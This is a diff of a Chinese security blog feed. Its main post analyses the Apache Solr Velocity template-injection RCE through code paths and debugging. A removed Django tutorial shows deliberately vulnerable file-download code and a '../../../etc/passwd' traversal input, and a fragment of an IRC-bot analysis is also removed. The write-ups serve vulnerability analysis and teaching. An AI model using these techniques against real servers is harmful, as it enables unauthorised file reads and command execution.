-      <description>
+      <description>&lt;script src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js&#34;&gt;&lt;/script&gt;
+### 0x01 概述
 
-&lt;script src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js&#34;&gt;&lt;/script&gt;
+10月30日，研究员S00pY在GitHub发布了Apache Solr Velocity模版注入远程命令执行的poc，该漏洞通过设置资源加载属性，利用`VelocityResponseWriter`插件执行自定义模板，进而进行远程代码执行，危害较大，下面是分析过程。
 
-&lt;h3 id=&#34;0x01-概述&#34;&gt;0x01 概述&lt;/h3&gt;
+### 0x02 环境搭建
 
-&lt;p&gt;10月30日，研究员S00pY在GitHub发布了Apache Solr Velocity模版注入远程命令执行的poc，该漏洞通过设置资源加载属性，利用&lt;code&gt;VelocityResponseWriter&lt;/code&gt;插件执行自定义模板，进而进行远程代码执行，危害较大，下面是分析过程。&lt;/p&gt;
+选择Solr 8.2.0二进制版本进行分析和复现
 
-&lt;h3 id=&#34;0x02-环境搭建&#34;&gt;0x02 环境搭建&lt;/h3&gt;
+下载地址：&lt;https://archive.apache.org/dist/lucene/solr/8.2.0/&gt;
 
-&lt;p&gt;选择Solr 8.2.0二进制版本进行分析和复现&lt;/p&gt;
+调试命令
 
-&lt;p&gt;下载地址：&lt;a href=&#34;https://archive.apache.org/dist/lucene/solr/8.2.0/&#34;&gt;https://archive.apache.org/dist/lucene/solr/8.2.0/&lt;/a&gt;&lt;/p&gt;
+```shell
+$ cd solr-8.2.0\server
+$ java &#34;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=9000&#34; -Dsolr.solr.home=&#34;../example/example-DIH/solr/&#34; -jar start.jar --module=http
+```
 
-&lt;p&gt;调试命令&lt;/p&gt;
+IDEA新建远程调试即可
 
-&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;$ cd solr-8.2.0\server
-$ java &amp;quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=9000&amp;quot; -Dsolr.solr.home=&amp;quot;../example/example-DIH/solr/&amp;quot; -jar start.jar --module=http
-&lt;/code&gt;&lt;/pre&gt;
+### 0x03 前置概念
 
-&lt;p&gt;IDEA新建远程调试即可&lt;/p&gt;
+`VelocityResponseWriter`(Velocity响应编写器)是 contrib/velocity 目录中可用的可选插件。当使用诸如 “_default”、“techproducts” 和 “example / files” 等配置时，它为浏览用户界面提供动力。
 
-&lt;h3 id=&#34;0x03-前置概念&#34;&gt;0x03 前置概念&lt;/h3&gt;
+必须添加它的 JAR 和依赖项（通过&lt;lib&gt;或 solr/home lib 包含），并且必须在 solrconfig.xml 注册，默认已经注册
 
-&lt;p&gt;&lt;code&gt;VelocityResponseWriter&lt;/code&gt;(Velocity响应编写器)是 contrib/velocity 目录中可用的可选插件。当使用诸如 “_default”、“techproducts” 和 “example / files” 等配置时，它为浏览用户界面提供动力。&lt;/p&gt;
+![1572507926900](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572507926900.png)
 
-&lt;p&gt;必须添加它的 JAR 和依赖项（通过&lt;lib&gt;或 solr/home lib 包含），并且必须在 solrconfig.xml 注册，默认已经注册&lt;/p&gt;
+其中有一个属性`params.resource.loader.enabled`，默认是`false`，需要手动开启
 
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572507926900.png&#34; alt=&#34;1572507926900&#34; /&gt;&lt;/p&gt;
+该参数表示允许加载程序在 Solr 请求参数中指定模板，例如：
 
-&lt;p&gt;其中有一个属性&lt;code&gt;params.resource.loader.enabled&lt;/code&gt;，默认是&lt;code&gt;false&lt;/code&gt;，需要手动开启&lt;/p&gt;
+```
+http://localhost:8983/solr/gettingstarted/select?q=\*:*&amp;wt=velocity&amp;v.template=xxx&amp;v.template.xxx=CUSTOM%3A%20%23core_name
+```
 
-&lt;p&gt;该参数表示允许加载程序在 Solr 请求参数中指定模板，例如：&lt;/p&gt;
+`v.template=xxx`表示创建一个名为“xxx”的模板，`v.template.xxx`则是模板内容
 
-&lt;pre&gt;&lt;code&gt;http://localhost:8983/solr/gettingstarted/select?q=\*:*&amp;amp;wt=velocity&amp;amp;v.template=xxx&amp;amp;v.template.xxx=CUSTOM%3A%20%23core_name
-&lt;/code&gt;&lt;/pre&gt;
+当这个属性设置为`true`时用户就可以传入任意模板内容进行模板注入，从而执行任意命令
 
-&lt;p&gt;&lt;code&gt;v.template=xxx&lt;/code&gt;表示创建一个名为“xxx”的模板，&lt;code&gt;v.template.xxx&lt;/code&gt;则是模板内容&lt;/p&gt;
+### 0x04 漏洞分析
 
-&lt;p&gt;当这个属性设置为&lt;code&gt;true&lt;/code&gt;时用户就可以传入任意模板内容进行模板注入，从而执行任意命令&lt;/p&gt;
+#### 设置`params.resource.loader.enabled`属性
 
-&lt;h3 id=&#34;0x04-漏洞分析&#34;&gt;0x04 漏洞分析&lt;/h3&gt;
+在Solr的Web.xml文件中能看到所有的请求都交给`org.apache.solr.servlet.SolrDispatchFilter`来处理
 
-&lt;h4 id=&#34;设置-params-resource-loader-enabled-属性&#34;&gt;设置&lt;code&gt;params.resource.loader.enabled&lt;/code&gt;属性&lt;/h4&gt;
+![1572508606062](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572508606062.png)
 
-&lt;p&gt;在Solr的Web.xml文件中能看到所有的请求都交给&lt;code&gt;org.apache.solr.servlet.SolrDispatchFilter&lt;/code&gt;来处理&lt;/p&gt;
+具体的则是其中的`doFilter()`方法。在对路由经过初步处理后，进行两个关键操作：
 
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572508606062.png&#34; alt=&#34;1572508606062&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;具体的则是其中的&lt;code&gt;doFilter()&lt;/code&gt;方法。在对路由经过初步处理后，进行两个关键操作：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;HttpSolrCall call = this.getHttpSolrCall(request, response, retry);
+```java
+HttpSolrCall call = this.getHttpSolrCall(request, response, retry);
 //...
 SolrDispatchFilter.Action result = call.call();
-&lt;/code&gt;&lt;/pre&gt;
+```
 
-&lt;p&gt;初始化一个&lt;code&gt;HttpSolrCall&lt;/code&gt;对象后调用它的&lt;code&gt;call()&lt;/code&gt;方法，在&lt;code&gt;call()&lt;/code&gt;方法中会对路由中具体的组件初始化出对应的handler，再由这个handler去调用这个组件的各个方法&lt;/p&gt;
+初始化一个`HttpSolrCall`对象后调用它的`call()`方法，在`call()`方法中会对路由中具体的组件初始化出对应的handler，再由这个handler去调用这个组件的各个方法
 
-&lt;p&gt;在Solr 8.2.0中具体的路由有37个，每一类都有对应的handler，都在&lt;code&gt;org.apache.solr.handler&lt;/code&gt;中定义，例如&lt;code&gt;solr/solr/get&lt;/code&gt;对应的hendler为&lt;code&gt;RealTimeGetHandler&lt;/code&gt;&lt;/p&gt;
+在Solr 8.2.0中具体的路由有37个，每一类都有对应的handler，都在`org.apache.solr.handler`中定义，例如`solr/solr/get`对应的hendler为`RealTimeGetHandler`
 
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572515458181.png&#34; alt=&#34;1572515458181&#34; /&gt;&lt;/p&gt;
+![1572515458181](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572515458181.png)
 
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572516210537.png&#34; alt=&#34;1572516210537&#34; /&gt;&lt;/p&gt;
+![1572516210537](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572516210537.png)
 
-&lt;p&gt;而&lt;code&gt;/solr/solr/config&lt;/code&gt; 由&lt;code&gt;SolrConfigHandler&lt;/code&gt;来分别处理GET和POST请求&lt;/p&gt;
+而`/solr/solr/config` 由`SolrConfigHandler`来分别处理GET和POST请求
 
-&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;SolrConfigHandler.Command command = new SolrConfigHandler.Command(req, rsp, httpMethod);
-if (&amp;quot;POST&amp;quot;.equals(httpMethod)) {
+```java
+SolrConfigHandler.Command command = new SolrConfigHandler.Command(req, rsp, httpMethod);
+if (&#34;POST&#34;.equals(httpMethod)) {
     if (configEditing_disabled || this.isImmutableConfigSet) {
-        String reason = configEditing_disabled ? &amp;quot;due to disable.configEdit&amp;quot; : &amp;quot;because ConfigSet is immutable&amp;quot;;
-        throw new SolrException(ErrorCode.FORBIDDEN, &amp;quot; solrconfig editing is not enabled &amp;quot; + reason);
+        String reason = configEditing_disabled ? &#34;due to disable.configEdit&#34; : &#34;because ConfigSet is immutable&#34;;
+        throw new SolrException(ErrorCode.FORBIDDEN, &#34; solrconfig editing is not enabled &#34; + reason);
     }
 
     try {
@@ -96,88 +497,84 @@ if (&amp;quot;POST&amp;quot;.equals(httpMethod)) {
 } else {
     command.handleGET();
 }
-&lt;/code&gt;&lt;/pre&gt;
+```
 
-&lt;p&gt;私有类&lt;code&gt;Command&lt;/code&gt;会对当前路由的webapp和path做一个切分，对于POST请求，分别会通过&lt;code&gt;SolrConfigHandler.Command#handlePOST()&lt;/code&gt;方法来处理&lt;/p&gt;
+私有类`Command`会对当前路由的webapp和path做一个切分，对于POST请求，分别会通过`SolrConfigHandler.Command#handlePOST()`方法来处理
 
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572509660264.png&#34; alt=&#34;1572509660264&#34; /&gt;&lt;/p&gt;
+![1572509660264](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572509660264.png)
 
-&lt;p&gt;接着调用&lt;code&gt;SolrConfigHandler.Command#handleCommands()&lt;/code&gt;，Solr中&lt;code&gt;Config API&lt;/code&gt;对应的实现都是由这个方法来完成的，如&lt;code&gt;set-property&lt;/code&gt;、&lt;code&gt;unset-property&lt;/code&gt;等&lt;/p&gt;
+接着调用`SolrConfigHandler.Command#handleCommands()`，Solr中`Config API`对应的实现都是由这个方法来完成的，如`set-property`、`unset-property`等
 
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572516461804.png&#34; alt=&#34;1572516461804&#34; /&gt;&lt;/p&gt;
+![1572516461804](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572516461804.png)
 
-&lt;p&gt;此处主要关注更新配置的参数&lt;/p&gt;
+此处主要关注更新配置的参数
 
-&lt;p&gt;从&lt;a href=&#34;https://lucene.apache.org/solr/guide/8_2/config-api.html#basic-commands-for-components&#34;&gt;文档&lt;/a&gt;可以了解对于&lt;code&gt;responsewriter&lt;/code&gt;的操作有下面三个&lt;/p&gt;
+从[文档](https://lucene.apache.org/solr/guide/8_2/config-api.html#basic-commands-for-components)可以了解对于`responsewriter`的操作有下面三个
 
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;add-queryresponsewriter&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;update-queryresponsewriter&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;delete-queryresponsewriter&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
+- `add-queryresponsewriter`
+- `update-queryresponsewriter`
+- `delete-queryresponsewriter`
 
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572516621585.png&#34; alt=&#34;1572516621585&#34; /&gt;&lt;/p&gt;
+![1572516621585](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572516621585.png)
 
-&lt;p&gt;代码中也能看到对操作名称按&lt;code&gt;-&lt;/code&gt;进行分割提取出对应操作，然后由&lt;code&gt;updateNamedPlugin()&lt;/code&gt;方法来完成配置文件的创建/覆盖操作，具体跟入看一下&lt;/p&gt;
+代码中也能看到对操作名称按`-`进行分割提取出对应操作，然后由`updateNamedPlugin()`方法来完成配置文件的创建/覆盖操作，具体跟入看一下
 
-&lt;p&gt;在&lt;code&gt;updateNamedPlugin()&lt;/code&gt;中有个&lt;code&gt;verifyClass&lt;/code&gt;的调用，当传入参数没有设置&lt;code&gt;runtimeLib&lt;/code&gt;时会去创建class字段指定的类，所以当我们传入&lt;code&gt;VelocityResponseWriter&lt;/code&gt;时，会在其初始化的时候写入对应的参数&lt;/p&gt;
+在`updateNamedPlugin()`中有个`verifyClass`的调用，当传入参数没有设置`runtimeLib`时会去创建class字段指定的类，所以当我们传入`VelocityResponseWriter`时，会在其初始化的时候写入对应的参数
 
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572518046827.png&#34; alt=&#34;1572518046827&#34; /&gt;&lt;/p&gt;
+![1572518046827](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572518046827.png)
 
-&lt;p&gt;然后返回到&lt;code&gt;handleCommands()&lt;/code&gt;中把配置写入到&lt;code&gt;configoverlay.json&lt;/code&gt;文件&lt;/p&gt;
+然后返回到`handleCommands()`中把配置写入到`configoverlay.json`文件
 
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572518122216.png&#34; alt=&#34;1572518122216&#34; /&gt;&lt;/p&gt;
+![1572518122216](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572518122216.png)
 
-&lt;p&gt;因此，通过&lt;code&gt;config api&lt;/code&gt;可以重新设置&lt;code&gt;VelocityResponseWriter&lt;/code&gt;的属性，为下一步加载模板提供入口&lt;/p&gt;
+因此，通过`config api`可以重新设置`VelocityResponseWriter`的属性，为下一步加载模板提供入口
 
-&lt;p&gt;三种命令的区别如下：&lt;/p&gt;
+三种命令的区别如下：
 
-&lt;blockquote&gt;
-&lt;p&gt;add- 命令都会将新配置添加到configoverlay.json，这将覆盖solrconfig.xml组件中的任何其他设置；
-update- 命令覆盖configoverlay.json中的现有设置；
-delete-命令从configoverlay.json中删除设置&lt;/p&gt;
-&lt;/blockquote&gt;
+&gt; add- 命令都会将新配置添加到configoverlay.json，这将覆盖solrconfig.xml组件中的任何其他设置；
+&gt; update- 命令覆盖configoverlay.json中的现有设置；
+&gt; delete-命令从configoverlay.json中删除设置
 
-&lt;h4 id=&#34;注入自定义模板&#34;&gt;注入自定义模板&lt;/h4&gt;
 
-&lt;p&gt;在&lt;code&gt;SolrDispatchFilter&lt;/code&gt;中有有一个枚举类&lt;code&gt;Action&lt;/code&gt;，定义了每个handler的所属的操作，通过ConfigAPI更新配置时，当前的action是&lt;code&gt;PROCESS&lt;/code&gt;，因此会进入&lt;code&gt;HttpSolrCall.call()&lt;/code&gt;的&lt;code&gt;PROCESS&lt;/code&gt;分支&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572576900618.png&#34; alt=&#34;1572576900618&#34; /&gt;&lt;/p&gt;
+#### 注入自定义模板
 
-&lt;p&gt;之后通过&lt;code&gt;QueryResponseWriterUtil.writeQueryResponse()&lt;/code&gt;进入&lt;code&gt;VelocityResponseWriter.write&lt;/code&gt;，在这个方法中完成&lt;code&gt;Velocity&lt;/code&gt;的解析&lt;/p&gt;
+在`SolrDispatchFilter`中有有一个枚举类`Action`，定义了每个handler的所属的操作，通过ConfigAPI更新配置时，当前的action是`PROCESS`，因此会进入`HttpSolrCall.call()`的`PROCESS`分支
 
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572577848829.png&#34; alt=&#34;1572577848829&#34; /&gt;&lt;/p&gt;
+![1572576900618](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572576900618.png)
 
-&lt;p&gt;首先会初始化一个解析模板的引擎&lt;code&gt;VelocityEngine&lt;/code&gt;，在创建引擎的过程中会检查是否允许参数资源加载，这也就是第一个请求设置的&lt;code&gt;params.resource.loader.enabled&lt;/code&gt;属性值。由于&lt;code&gt;solr.resource.loader.enabled&lt;/code&gt;默认是开启的，所以此处只需要设置params的值&lt;/p&gt;
+之后通过`QueryResponseWriterUtil.writeQueryResponse()`进入`VelocityResponseWriter.write`，在这个方法中完成`Velocity`的解析
 
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572577993537.png&#34; alt=&#34;1572577993537&#34; /&gt;&lt;/p&gt;
+![1572577848829](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572577848829.png)
 
-&lt;p&gt;之后通过&lt;code&gt;Template.getTemplate()&lt;/code&gt;设置自定义模板，然后进入&lt;code&gt;Template.merge()&lt;/code&gt;进入AST解析，在解析过程中会调用到&lt;code&gt;ASTMethod.execute()&lt;/code&gt;方法，这个流程与之前披露的CVE-2019-11581 JIRA模板注入漏洞是一样的，不再赘述，详细可以参考&lt;a href=&#34;https://kylingit.com/blog/cve-2019-11581-atlassian-jira%E6%9C%AA%E6%8E%88%E6%9D%83%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&#34;&gt;CVE-2019-11581 ATLASSIAN JIRA 未授权模板注入漏洞分析&lt;/a&gt;&lt;/p&gt;
+首先会初始化一个解析模板的引擎`VelocityEngine`，在创建引擎的过程中会检查是否允许参数资源加载，这也就是第一个请求设置的`params.resource.loader.enabled`属性值。由于`solr.resource.loader.enabled`默认是开启的，所以此处只需要设置params的值
 
-&lt;blockquote&gt;
-&lt;p&gt;回过头看一下&lt;code&gt;Velocity&lt;/code&gt;渲染的大致流程：&lt;/p&gt;
+![1572577993537](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572577993537.png)
 
-&lt;blockquote&gt;
-&lt;p&gt;Velocity 渲染引擎首先磁盘加载模板文件到内存，然后解析模板模板文件为 AST 结构，并对 AST 中每个节点进行初始化，第二次加载同一个模板文件时候如果开启了缓存则直接返回模板资源，通过使用资源缓存节省了从磁盘加载并重新解析为 AST 的开销。&lt;/p&gt;
-&lt;/blockquote&gt;
+之后通过`Template.getTemplate()`设置自定义模板，然后进入`Template.merge()`进入AST解析，在解析过程中会调用到`ASTMethod.execute()`方法，这个流程与之前披露的CVE-2019-11581 JIRA模板注入漏洞是一样的，不再赘述，详细可以参考[CVE-2019-11581 ATLASSIAN JIRA 未授权模板注入漏洞分析](https://kylingit.com/blog/cve-2019-11581-atlassian-jira%E6%9C%AA%E6%8E%88%E6%9D%83%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)
 
-&lt;p&gt;而&lt;code&gt;ASTMethod.execute()&lt;/code&gt;方法设计之初是在&lt;code&gt;Velocity parse&lt;/code&gt;解析模板的过程中，通过反射调用相关方法完成正常模板渲染动作，例如获取背景颜色、获取 text 内容、获取页面编码等，但当此处攻击者传入精心构造的数据后，利用反射执行了&lt;code&gt;java.lang.Runtime.getRuntime&lt;/code&gt;，成功达到命令执行的目的&lt;/p&gt;
-&lt;/blockquote&gt;
+&gt;回过头看一下`Velocity`渲染的大致流程：
+&gt;
+&gt;&gt; Velocity 渲染引擎首先磁盘加载模板文件到内存，然后解析模板模板文件为 AST 结构，并对 AST 中每个节点进行初始化，第二次加载同一个模板文件时候如果开启了缓存则直接返回模板资源，通过使用资源缓存节省了从磁盘加载并重新解析为 AST 的开销。
+&gt;
+&gt;而`ASTMethod.execute()`方法设计之初是在`Velocity parse`解析模板的过程中，通过反射调用相关方法完成正常模板渲染动作，例如获取背景颜色、获取 text 内容、获取页面编码等，但当此处攻击者传入精心构造的数据后，利用反射执行了`java.lang.Runtime.getRuntime`，成功达到命令执行的目的
 
-&lt;p&gt;调用栈&lt;/p&gt;
+调用栈
 
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572575433979.png&#34; alt=&#34;1572575433979&#34; /&gt;&lt;/p&gt;
+![1572575433979](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572575433979.png)
 
-&lt;p&gt;PoC&lt;/p&gt;
+PoC
 
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572578779708.png&#34; alt=&#34;1572578779708&#34; /&gt;&lt;/p&gt;
+![1572578779708](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572578779708.png)
 
-&lt;p&gt;参考&lt;/p&gt;
 
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;https://lucene.apache.org/solr/guide/8_2/config-api.html#basic-commands-for-components&#34;&gt;https://lucene.apache.org/solr/guide/8_2/config-api.html#basic-commands-for-components&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://github.com/veracode-research/solr-injection#7-cve-2019-xxxx-rce-via-velocity-template-by-_s00py&#34;&gt;https://github.com/veracode-research/solr-injection#7-cve-2019-xxxx-rce-via-velocity-template-by-_s00py&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
+
+参考
+
+- https://lucene.apache.org/solr/guide/8_2/config-api.html#basic-commands-for-components
+- https://github.com/veracode-research/solr-injection#7-cve-2019-xxxx-rce-via-velocity-template-by-_s00py
+
+
 
 &lt;script&gt;pangu.spacingPage();&lt;/script&gt;
 </description>
@@ -3331,295 +3728,6 @@ my @channels = (&amp;quot;#Perl&amp;quot;); 	# IRC频道
 &lt;h2 id=&#34;0x04-总结&#34;&gt;0x04 总结&lt;/h2&gt;
 
 &lt;p&gt;这两款IRC bot在互联网上已经存在很久了，最近被广泛利用的Drupal RCE漏洞和Weblogic XMLDecoder反序列化漏洞使此类基于IRC协议的恶意脚本重新流行起来，根据在线文件分享平台&lt;a href=&#34;https://pastebin.com/search?q=ircbot&#34;&gt;pastebin&lt;/a&gt;查询相关脚本也不在少数，而且存在多种语言版本的IRC bot，黑客直接通过各种远程漏洞植入样本，接受C&amp;amp;C控制，具有很大的危害性。&lt;/p&gt;
-
-&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>Django框架防止目录穿越——从路由传参说起</title>
-      <link>https://kylingit.com/blog/django%E6%A1%86%E6%9E%B6%E9%98%B2%E6%AD%A2%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E4%BB%8E%E8%B7%AF%E7%94%B1%E4%BC%A0%E5%8F%82%E8%AF%B4%E8%B5%B7/</link>
-      <pubDate>Wed, 16 May 2018 10:59:02 +0000</pubDate>
-      
-      <guid>https://kylingit.com/blog/django%E6%A1%86%E6%9E%B6%E9%98%B2%E6%AD%A2%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E4%BB%8E%E8%B7%AF%E7%94%B1%E4%BC%A0%E5%8F%82%E8%AF%B4%E8%B5%B7/</guid>
-      <description>
-
-&lt;script src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js&#34;&gt;&lt;/script&gt;
-
-&lt;p&gt;最近审计代码过程中出现了没有正确处理url形成目录穿越，导致可以读取或下载任意文件的案例，过程很简单，由此却引发了和小伙伴的讨论，对风险的控制需要依赖框架本身还是必须从根本上规避风险点。下面就通过目录遍历漏洞的案例分析一下django的路由传参方式，以及在日常开发中如何避免此类风险。&lt;/p&gt;
-
-&lt;h3 id=&#34;0x01-示例代码&#34;&gt;0x01 示例代码&lt;/h3&gt;
-
-&lt;p&gt;我们写一个简单的views，用来实现文件下载功能，代码如下&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import os
-
-from django.http import HttpResponseNotFound, HttpResponse
-
-# Create your views here.
-def file_download(request, filename):
-    path = &#39;/tmp/test/2&#39;
-    full_path = os.path.join(path, filename)
-    if not os.path.exists(full_path):
-        return HttpResponseNotFound(&#39;&amp;lt;h1&amp;gt;file not found&amp;lt;/h1&amp;gt;&#39;)
-    else:
-        response = HttpResponse(read_file(full_path))
-        response[&#39;Content-Type&#39;] = &#39;application/octet-stream&#39;
-        response[&#39;Content-Length&#39;] = os.path.getsize(full_path)
-        response[&#39;Content-Disposition&#39;] = &#39;attachment; filename=%s&#39; % filename
-        response[&#39;Accept-Ranges&#39;] = &#39;bytes&#39;
-        return response
-
-def read_file(filename, bufsize=8192):
-    try:
-        with open(filename, &#39;rb&#39;) as f:
-            while True:
-                content = f.read(bufsize)
-                if content:
-                    yield content
-                else:
-                    break
-    except Exception as e:
-        print(e.message)
-        print(&#39;read error&#39;)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;代码很简单，就不过多解释了，目的是提供&lt;code&gt;/tmp/test/2/&lt;/code&gt;目录下的文件下载。&lt;code&gt;read_file()&lt;/code&gt;使用了切片避免文件过大造成拒绝服务风险。&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;/tmp/test/&lt;/code&gt;结构如下，内容分别为1,2&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;test
-├── 1
-│   └── 1.txt
-└── 2
-    └── 2.txt
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;有经验的同学马上就能看出&lt;code&gt;file_download()&lt;/code&gt;对传入的文件名并没有任何限制，只是做了文件是否存在的判断，也就是说我们可以传入&lt;code&gt;/../1/1.txt&lt;/code&gt;的文件名，&lt;code&gt;full_path&lt;/code&gt;经过拼接就会成为&lt;code&gt;/tmp/test/2/../../1/1.txt&lt;/code&gt;，传入&lt;code&gt;read_file()&lt;/code&gt;就能够读取到1.txt&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/JUIFX&#34; alt=&#34;1.txt&#34; /&gt;
-类似的，如果我们传入&lt;code&gt;../../../etc/passwd&lt;/code&gt;就能下载到敏感文件&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/h0bP3&#34; alt=&#34;passwd&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;可是事实上每次都是如此吗？&lt;/p&gt;
-
-&lt;p&gt;其实这跟我们如何处理传入的url有关，也就是Django对于url路由的处理。&lt;/p&gt;
-
-&lt;h3 id=&#34;0x02-测试&#34;&gt;0x02 测试&lt;/h3&gt;
-
-&lt;p&gt;在刚才的示例中，我们在&lt;code&gt;urls.py&lt;/code&gt;中是这样定义路由的&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;url(r&#39;^download/(.+)$&#39;, &amp;quot;mysite.views.file_download&amp;quot;),&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;相信这也是很多同学会采用的写法，匹配任意文件名使得可以下载&lt;code&gt;/tmp/test/2&lt;/code&gt;中的任意文件，认为在views里面限定了目录，只能读取到该文件夹下的内容，忽略了用户可以输入&lt;code&gt;../&lt;/code&gt;进行目录穿越，而在接收文件名的时候却没有对参数进行任何过滤，这样就会导致一个任意文件读取的漏洞。&lt;/p&gt;
-
-&lt;p&gt;在django2.0中，url路由部分由&lt;code&gt;path&lt;/code&gt;代替&lt;code&gt;url&lt;/code&gt;，即原来的&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;url(r&#39;^articles/(?P&amp;lt;year&amp;gt;[0-9]{4})/$&#39;, views.year_archive),&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;新语法&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;path(&#39;articles/&amp;lt;int:year&amp;gt;/&#39;, views.year_archive),&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;新语法支持url参数的类型转化。这里的year_archive函数接收到的year参数作为参数，并且会自动转换year为整型而不是字符串。&lt;/p&gt;
-
-&lt;p&gt;这里的int称为路径转换器，&lt;a href=&#34;https://docs.djangoproject.com/en/2.0/topics/http/urls/#path-converters&#34;&gt;Path converters&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;默认情况下，Django内置下面的路径转换器:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;str - &lt;strong&gt;Matches any non-empty string, excluding the path separator, &amp;lsquo;/&amp;rsquo;.&lt;/strong&gt; This is the &lt;strong&gt;default&lt;/strong&gt; if a converter isn’t included in the expression.&lt;/li&gt;
-&lt;li&gt;int - Matches zero or any positive integer. Returns an int.&lt;/li&gt;
-&lt;li&gt;slug - Matches any slug string consisting of ASCII letters or numbers, plus the hyphen and underscore characters. For example, building-your-1st-django-site.&lt;/li&gt;
-&lt;li&gt;uuid - Matches a formatted UUID. To prevent multiple URLs from mapping to the same page, dashes must be included and letters must be lowercase. For example, 075194d3-6885-417e-a8a8-6c931e272f00. Returns a UUID instance.&lt;/li&gt;
-&lt;li&gt;path - &lt;strong&gt;Matches any non-empty string, including the path separator, &amp;lsquo;/&amp;rsquo;.&lt;/strong&gt; This allows you to match against a complete URL path rather than just a segment of a URL path as with str.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;我们重点关注一下&lt;code&gt;str&lt;/code&gt;和&lt;code&gt;path&lt;/code&gt;的区别，也就是&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;path(&#39;download/&amp;lt;str:filename&amp;gt;&#39;, views.file_download),&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;和&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;path(&#39;download/&amp;lt;path:filename&amp;gt;&#39;, views.file_download),&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;有什么不一样。&lt;/p&gt;
-
